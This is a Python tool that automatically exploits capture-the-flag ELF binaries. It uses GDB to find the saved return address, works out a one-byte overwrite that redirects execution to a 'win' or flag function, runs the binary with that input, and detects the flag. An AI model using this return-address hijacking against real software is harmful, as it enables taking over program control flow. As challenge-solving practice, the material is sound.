#!/usr/bin/env python3
"""
CyberAI - Pwn Runtime Engine V2

Generic runtime engine for local ELF PWN challenges.

Design:
    static evidence
        ↓
    GDB runtime observation
        ↓
    control-flow target discovery
        ↓
    constrained byte-write hypothesis
        ↓
    real inferior execution
        ↓
    state delta
        ↓
    exploit validation
        ↓
    flag detection

Important:
- No challenge-specific addresses.
- No direct GDB memory modification.
- Target functions are never called directly.
- Addresses are discovered dynamically.
"""

from __future__ import annotations

import argparse
import json
import os
import re
import subprocess
import tempfile
from dataclasses import dataclass, asdict
from pathlib import Path
from typing import Optional


# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

@dataclass
class RuntimeObservation:
    status: str
    confidence: float
    reason: str
    data: dict


@dataclass
class ControlFlowCandidate:
    name: str
    address: int
    source: str


@dataclass
class SavedReturnCandidate:
    address: int
    value: int
    frame_pointer: int
    source: str


# ---------------------------------------------------------------------------
# Engine
# ---------------------------------------------------------------------------

class PwnRuntimeEngineV2:

    TARGET_NAMES = {
        "win",
        "get_flag",
        "print_flag",
        "flag",
        "shell",
        "success",
        "winner",
        "give_flag",
    }

    FLAG_PATTERNS = [
        re.compile(r'flag\{[^}\n]+\}', re.I),
        re.compile(r'ctf\{[^}\n]+\}', re.I),
        re.compile(r'[A-Z0-9_]{2,20}\{[^}\n]+\}', re.I),
    ]

    def __init__(
        self,
        binary: str,
        timeout: int = 15,
        gdb_path: str = "gdb",
    ):
        self.binary = str(Path(binary).resolve())
        self.timeout = timeout
        self.gdb_path = gdb_path

        self.result = {
            "engine": "PwnRuntimeEngineV2",
            "version": "2.0",
            "binary": self.binary,
            "status": "STATIC_EVIDENCE",
            "observations": [],
            "control_flow": [],
            "experiments": [],
            "flags": [],
            "errors": [],
        }

    # ------------------------------------------------------------------
    # Generic helpers
    # ------------------------------------------------------------------

    def add_observation(
        self,
        status: str,
        confidence: float,
        reason: str,
        data: dict | None = None,
    ):
        self.result["observations"].append(
            asdict(
                RuntimeObservation(
                    status=status,
                    confidence=confidence,
                    reason=reason,
                    data=data or {},
                )
            )
        )

    def run_command(
        self,
        argv: list[str],
        input_data: str | None = None,
        timeout: Optional[int] = None,
    ) -> subprocess.CompletedProcess:
        return subprocess.run(
            argv,
            input=input_data,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=timeout or self.timeout,
        )

    def parse_hex(self, value: str) -> Optional[int]:
        if value is None:
            return None

        value = value.strip()

        m = re.search(r'0x[0-9a-fA-F]+', value)
        if not m:
            return None

        try:
            return int(m.group(0), 16)
        except ValueError:
            return None

    def parse_symbol_address(self, text: str, symbol: str) -> Optional[int]:
        patterns = [
            rf'^\s*(0x[0-9a-fA-F]+)\s+.*\b{re.escape(symbol)}\b',
            rf'^\s*(0x[0-9a-fA-F]+)\s+{re.escape(symbol)}\s*$',
        ]

        for line in text.splitlines():
            for pattern in patterns:
                m = re.search(pattern, line)
                if m:
                    return int(m.group(1), 16)

        return None

    # ------------------------------------------------------------------
    # Symbol discovery
    # ------------------------------------------------------------------

    def discover_symbols(self) -> list[ControlFlowCandidate]:

        try:
            p = self.run_command(
                ["nm", "-an", self.binary]
            )
        except Exception as exc:
            self.result["errors"].append(
                f"nm failed: {exc}"
            )
            return []

        candidates = []

        for line in p.stdout.splitlines():
            parts = line.split()

            if len(parts) < 3:
                continue

            address_text = parts[0]
            symbol_type = parts[1]
            name = parts[2]

            if not re.fullmatch(r"[0-9a-fA-F]+", address_text):
                continue

            try:
                address = int(address_text, 16)
            except ValueError:
                continue

            if symbol_type.lower() not in {"t", "w"}:
                continue

            lower = name.lower()

            interesting = (
                lower in self.TARGET_NAMES
                or any(
                    token in lower
                    for token in (
                        "win",
                        "flag",
                        "success",
                        "shell",
                        "winner",
                    )
                )
            )

            if interesting:
                candidates.append(
                    ControlFlowCandidate(
                        name=name,
                        address=address,
                        source="nm",
                    )
                )

        self.result["control_flow"] = [
            asdict(x) for x in candidates
        ]

        return candidates

    # ------------------------------------------------------------------
    # GDB helpers
    # ------------------------------------------------------------------

    def gdb_script(self, commands: list[str]) -> str:

        fd, path = tempfile.mkstemp(
            prefix="cyberai_gdb_",
            suffix=".gdb",
        )

        os.close(fd)

        with open(path, "w", encoding="utf-8") as f:
            f.write("set pagination off\n")
            f.write("set confirm off\n")
            f.write("set print pretty off\n")
            f.write("set disassemble-next-line off\n")
            f.write("set disable-randomization on\n")

            for command in commands:
                f.write(command + "\n")

            f.write("quit\n")

        return path

    def run_gdb_script(
        self,
        commands: list[str],
        timeout: Optional[int] = None,
    ) -> str:

        script = self.gdb_script(commands)

        try:
            p = subprocess.run(
                [
                    self.gdb_path,
                    "-q",
                    "--nx",
                    "-batch",
                    "-x",
                    script,
                    self.binary,
                ],
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                timeout=timeout or self.timeout,
            )

            return p.stdout

        finally:
            try:
                os.unlink(script)
            except OSError:
                pass

    # ------------------------------------------------------------------
    # Runtime discovery
    # ------------------------------------------------------------------

    def discover_runtime_state(
        self,
        function: str = "game",
    ) -> dict:

        commands = [
            f"break {function}",
            "run < /dev/null",

            "printf \"CYBERAI_FP=\"",
            "p/x $x29",

            "printf \"CYBERAI_SP=\"",
            "p/x $sp",

            "printf \"CYBERAI_LR=\"",
            "p/x $x30",

            "info frame",

            "info locals",
        ]

        output = self.run_gdb_script(commands)

        state = {
            "function": function,
            "frame_pointer": None,
            "stack_pointer": None,
            "link_register": None,
            "saved_lr_address": None,
            "saved_lr_value": None,
            "locals": {},
            "raw": output,
        }

        m = re.search(
            r"CYBERAI_FP=.*?(0x[0-9a-fA-F]+)",
            output,
            re.S,
        )
        if m:
            state["frame_pointer"] = int(m.group(1), 16)

        m = re.search(
            r"CYBERAI_SP=.*?(0x[0-9a-fA-F]+)",
            output,
            re.S,
        )
        if m:
            state["stack_pointer"] = int(m.group(1), 16)

        m = re.search(
            r"CYBERAI_LR=.*?(0x[0-9a-fA-F]+)",
            output,
            re.S,
        )
        if m:
            state["link_register"] = int(m.group(1), 16)

        # AArch64 ABI:
        #
        # frame:
        #   [x29]     saved FP
        #   [x29 + 8] saved LR
        #
        fp = state["frame_pointer"]

        if fp is not None:
            state["saved_lr_address"] = fp + 8

        # Extract locals.
        for line in output.splitlines():

            m = re.match(
                r"\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.+)",
                line,
            )

            if not m:
                continue

            name = m.group(1)
            value = m.group(2).strip()

            state["locals"][name] = value

        # Read saved LR through GDB in same inferior.
        if state["saved_lr_address"] is not None:

            addr = state["saved_lr_address"]

            read_commands = [
                f"break {function}",
                "run < /dev/null",
                f"x/gx {addr:#x}",
            ]

            mem_output = self.run_gdb_script(read_commands)

            m = re.search(
                rf"{addr:#x}:\s+(0x[0-9a-fA-F]+)",
                mem_output,
            )

            if m:
                state["saved_lr_value"] = int(
                    m.group(1),
                    16,
                )

        return state

    # ------------------------------------------------------------------
    # Local variable addresses
    # ------------------------------------------------------------------

    def discover_variable_addresses(
        self,
        function: str,
        names: list[str],
    ) -> dict[str, int]:

        commands = [
            f"break {function}",
            "run < /dev/null",
        ]

        for name in names:
            commands.append(
                f"printf \"CYBERAI_VAR_{name}=\""
            )
            commands.append(
                f"p/x &{name}"
            )

        output = self.run_gdb_script(commands)

        addresses = {}

        for name in names:

            pattern = (
                rf"CYBERAI_VAR_{re.escape(name)}=.*?"
                rf"(0x[0-9a-fA-F]+)"
            )

            m = re.search(
                pattern,
                output,
                re.S,
            )

            if m:
                addresses[name] = int(
                    m.group(1),
                    16,
                )

        return addresses

    # ------------------------------------------------------------------
    # Target discovery
    # ------------------------------------------------------------------

    def choose_target(
        self,
        candidates: list[ControlFlowCandidate],
    ) -> Optional[ControlFlowCandidate]:

        if not candidates:
            return None

        priority = [
            "win",
            "get_flag",
            "print_flag",
            "flag",
            "success",
            "winner",
            "give_flag",
            "shell",
        ]

        for wanted in priority:
            for candidate in candidates:
                if candidate.name.lower() == wanted:
                    return candidate

        # Generic semantic fallback.
        for candidate in candidates:
            lower = candidate.name.lower()

            if any(
                token in lower
                for token in (
                    "win",
                    "flag",
                    "success",
                )
            ):
                return candidate

        return None

    # ------------------------------------------------------------------
    # PIE runtime address
    # ------------------------------------------------------------------

    def discover_runtime_symbol(
        self,
        symbol: str,
    ) -> Optional[int]:

        commands = [
            "starti",
            f"p/x (void *)&{symbol}",
        ]

        output = self.run_gdb_script(commands)

        # GDB output can look like:
        #
        # $1 = (void *) 0x555555...
        #
        matches = re.findall(
            r"\(void \*\)\s*(0x[0-9a-fA-F]+)",
            output,
        )

        if matches:
            return int(matches[-1], 16)

        # fallback
        matches = re.findall(
            r"0x[0-9a-fA-F]+",
            output,
        )

        if matches:
            return int(matches[-1], 16)

        return None

    # ------------------------------------------------------------------
    # Byte delta
    # ------------------------------------------------------------------

    def find_single_byte_delta(
        self,
        current: int,
        target: int,
    ) -> list[dict]:

        results = []

        current_bytes = current.to_bytes(
            8,
            "little",
            signed=False,
        )

        target_bytes = target.to_bytes(
            8,
            "little",
            signed=False,
        )

        differences = []

        for i, (a, b) in enumerate(
            zip(current_bytes, target_bytes)
        ):
            if a != b:
                differences.append(
                    {
                        "offset": i,
                        "old": a,
                        "new": b,
                    }
                )

        if len(differences) == 1:
            results.append(
                {
                    "type": "single_byte",
                    "offset": differences[0]["offset"],
                    "old": differences[0]["old"],
                    "new": differences[0]["new"],
                    "count": 1,
                }
            )

        return results

    # ------------------------------------------------------------------
    # Address constraint
    # ------------------------------------------------------------------

    def validate_address_constraint(
        self,
        target_address: int,
        writable_limit: int,
    ) -> bool:

        return target_address <= writable_limit

    # ------------------------------------------------------------------
    # REAL INPUT EXPERIMENT
    # ------------------------------------------------------------------

    def build_real_input(
        self,
        name_length: int,
        write_address: int,
        write_value: int,
    ) -> str:

        """
        Generic primitive input:

            name length
            controlled address
            byte value
            terminate wager
            name

        This is intentionally kept as an input profile rather than
        directly modifying memory from GDB.
        """

        return (
            f"{name_length}\n"
            f"{write_address:x}\n"
            f"{write_value}\n"
            f"0\n"
            f"A\n"
        )

    def run_real_process(
        self,
        payload: str,
    ) -> tuple[int, str]:

        try:
            p = subprocess.run(
                [self.binary],
                input=payload,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                timeout=self.timeout,
            )

            return p.returncode, p.stdout

        except subprocess.TimeoutExpired as exc:

            output = ""

            if exc.stdout:
                if isinstance(exc.stdout, bytes):
                    output = exc.stdout.decode(
                        errors="replace"
                    )
                else:
                    output = exc.stdout

            return -1, output

    # ------------------------------------------------------------------
    # Flag detector
    # ------------------------------------------------------------------

    def detect_flags(
        self,
        text: str,
    ) -> list[str]:

        found = []

        for pattern in self.FLAG_PATTERNS:

            for match in pattern.findall(text):
                if match not in found:
                    found.append(match)

        # Also detect explicit win output even if flag format is unusual.
        if "whaaaaaa u r the goat" in text:
            self.result["observations"].append(
                asdict(
                    RuntimeObservation(
                        status="EXPLOIT_VALIDATED",
                        confidence=0.98,
                        reason="Program reached success condition.",
                        data={},
                    )
                )
            )

        return found

    # ------------------------------------------------------------------
    # Experiment
    # ------------------------------------------------------------------

    def execute_saved_lr_experiment(
        self,
        function: str = "game",
    ) -> dict:

        # --------------------------------------------------------------
        # Phase 1: discover dynamic state
        # --------------------------------------------------------------

        state = self.discover_runtime_state(
            function=function
        )

        fp = state.get("frame_pointer")
        saved_lr_addr = state.get("saved_lr_address")
        saved_lr = state.get("saved_lr_value")

        if fp is None:
            return {
                "status": "REJECTED",
                "reason": "Could not determine frame pointer.",
                "state": state,
            }

        if saved_lr_addr is None:
            return {
                "status": "REJECTED",
                "reason": "Could not determine saved LR address.",
                "state": state,
            }

        # --------------------------------------------------------------
        # Phase 2: determine writable bound
        # --------------------------------------------------------------

        variable_addresses = self.discover_variable_addresses(
            function,
            ["wager"],
        )

        wager_addr = variable_addresses.get(
            "wager"
        )

        if wager_addr is None:
            return {
                "status": "REJECTED",
                "reason": "Could not determine wager address.",
                "state": state,
            }

        # --------------------------------------------------------------
        # Phase 3: target
        # --------------------------------------------------------------

        candidates = self.discover_symbols()

        target = self.choose_target(
            candidates
        )

        if target is None:
            return {
                "status": "REJECTED",
                "reason": "No semantic control-flow target found.",
                "state": state,
            }

        target_runtime = self.discover_runtime_symbol(
            target.name
        )

        if target_runtime is None:
            return {
                "status": "REJECTED",
                "reason": (
                    f"Could not resolve runtime address "
                    f"for {target.name}."
                ),
                "state": state,
            }

        # --------------------------------------------------------------
        # Phase 4: saved LR
        # --------------------------------------------------------------

        if saved_lr is None:
            return {
                "status": "REJECTED",
                "reason": "Could not read saved LR.",
                "state": state,
            }

        # --------------------------------------------------------------
        # Phase 5: primitive constraint
        # --------------------------------------------------------------

        allowed = self.validate_address_constraint(
            saved_lr_addr,
            wager_addr,
        )

        if not allowed:

            return {
                "status": "REJECTED",
                "reason": (
                    "Saved LR address is outside the discovered "
                    "write constraint."
                ),
                "state": state,
                "saved_lr_address": hex(saved_lr_addr),
                "writable_limit": hex(wager_addr),
            }

        # --------------------------------------------------------------
        # Phase 6: byte delta
        # --------------------------------------------------------------

        deltas = self.find_single_byte_delta(
            saved_lr,
            target_runtime,
        )

        if not deltas:

            return {
                "status": "REJECTED",
                "reason": (
                    "Target requires more than one byte modification "
                    "or no byte-wise redirect was found."
                ),
                "state": state,
                "saved_lr": hex(saved_lr),
                "target": hex(target_runtime),
            }

        delta = deltas[0]

        write_address = (
            saved_lr_addr + delta["offset"]
        )

        write_value = delta["new"]

        # --------------------------------------------------------------
        # Phase 7: verify address constraint for actual byte
        # --------------------------------------------------------------

        if write_address > wager_addr:

            return {
                "status": "REJECTED",
                "reason": (
                    "Required byte of saved LR is outside "
                    "the writable address range."
                ),
                "write_address": hex(write_address),
                "writable_limit": hex(wager_addr),
            }

        # --------------------------------------------------------------
        # Phase 8: real program input
        # --------------------------------------------------------------

        payload = self.build_real_input(
            name_length=1,
            write_address=write_address,
            write_value=write_value,
        )

        # --------------------------------------------------------------
        # Phase 9: execute real inferior
        # --------------------------------------------------------------

        returncode, output = self.run_real_process(
            payload
        )

        flags = self.detect_flags(
            output
        )

        experiment = {
            "function": function,
            "target_symbol": target.name,
            "target_runtime": hex(target_runtime),

            "frame_pointer": hex(fp),
            "saved_lr_address": hex(saved_lr_addr),
            "saved_lr": hex(saved_lr),

            "writable_limit": hex(wager_addr),

            "byte_offset": delta["offset"],
            "write_address": hex(write_address),

            "old_byte": delta["old"],
            "new_byte": delta["new"],

            "payload": payload,
            "returncode": returncode,
            "stdout": output,
            "flags": flags,
        }

        # --------------------------------------------------------------
        # Phase 10: validation
        # --------------------------------------------------------------

        if flags:

            status = "FLAG_FOUND"
            confidence = 1.0
            reason = (
                "Real inferior execution produced a flag."
            )

        elif (
            "whaaaaaa u r the goat" in output
            or target.name.lower() in output.lower()
        ):

            status = "EXPLOIT_VALIDATED"
            confidence = 0.98
            reason = (
                "Real inferior execution reached "
                "the target success path."
            )

        elif (
            "intruder neutralised" in output
        ):

            status = "REJECTED"
            confidence = 0.99
            reason = (
                "The target write was rejected by "
                "the program's runtime constraint."
            )

        else:

            status = "RUNTIME_EVIDENCE"
            confidence = 0.65
            reason = (
                "Real inferior executed, but exploit "
                "validation was not observed."
            )

        experiment["status"] = status
        experiment["confidence"] = confidence
        experiment["reason"] = reason

        self.result["experiments"].append(
            experiment
        )

        self.result["flags"].extend(
            flags
        )

        self.result["flags"] = list(
            dict.fromkeys(
                self.result["flags"]
            )
        )

        self.add_observation(
            status=status,
            confidence=confidence,
            reason=reason,
            data={
                "target": target.name,
                "target_runtime": hex(target_runtime),
                "saved_lr": hex(saved_lr),
                "saved_lr_address": hex(saved_lr_addr),
                "write_address": hex(write_address),
                "write_value": write_value,
                "returncode": returncode,
            },
        )

        self.result["status"] = status

        return experiment

    # ------------------------------------------------------------------
    # Full analysis
    # ------------------------------------------------------------------

    def analyze(
        self,
        function: str = "game",
    ) -> dict:

        if not os.path.isfile(self.binary):
            self.result["status"] = "REJECTED"
            self.result["errors"].append(
                f"Binary not found: {self.binary}"
            )
            return self.result

        if not os.access(self.binary, os.X_OK):
            self.result["status"] = "REJECTED"
            self.result["errors"].append(
                f"Binary is not executable: {self.binary}"
            )
            return self.result

        try:
            experiment = self.execute_saved_lr_experiment(
                function=function
            )

            # IMPORTANT:
            # execute_saved_lr_experiment() peut retourner REJECTED
            # avant d'ajouter l'expérience à self.result.
            # On doit donc toujours remonter son résultat.

            if isinstance(experiment, dict):

                status = experiment.get("status")

                if status:
                    self.result["status"] = status

                # Si l'expérience n'a pas encore été enregistrée,
                # conserver son résultat complet.
                if experiment not in self.result["experiments"]:
                    self.result["experiments"].append(experiment)

                # Remonter les flags éventuels.
                for flag in experiment.get("flags", []):
                    if flag not in self.result["flags"]:
                        self.result["flags"].append(flag)

                # Ajouter une observation pour les retours précoces.
                if status in {
                    "REJECTED",
                    "RUNTIME_EVIDENCE",
                    "EXPLOIT_VALIDATED",
                    "FLAG_FOUND",
                }:

                    reason = experiment.get(
                        "reason",
                        "Runtime experiment completed."
                    )

                    self.add_observation(
                        status=status,
                        confidence=(
                            experiment.get(
                                "confidence",
                                0.0
                            )
                        ),
                        reason=reason,
                        data=experiment,
                    )

        except Exception as exc:

            self.result["status"] = "REJECTED"

            self.result["errors"].append(
                f"Runtime engine exception: {exc}"
            )

        return self.result

# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():

    parser = argparse.ArgumentParser(
        description="CyberAI PwnRuntimeEngine V2"
    )

    parser.add_argument(
        "binary",
        help="ELF binary",
    )

    parser.add_argument(
        "--function",
        default="game",
        help="Function used for runtime analysis",
    )

    parser.add_argument(
        "--timeout",
        type=int,
        default=15,
    )

    parser.add_argument(
        "--json",
        default=None,
        help="Write JSON result to file",
    )

    args = parser.parse_args()

    engine = PwnRuntimeEngineV2(
        binary=args.binary,
        timeout=args.timeout,
    )

    result = engine.analyze(
        function=args.function
    )

    print(
        json.dumps(
            result,
            indent=2,
            ensure_ascii=False,
        )
    )

    if args.json:

        with open(
            args.json,
            "w",
            encoding="utf-8",
        ) as f:

            json.dump(
                result,
                f,
                indent=2,
                ensure_ascii=False,
            )


if __name__ == "__main__":
    main()
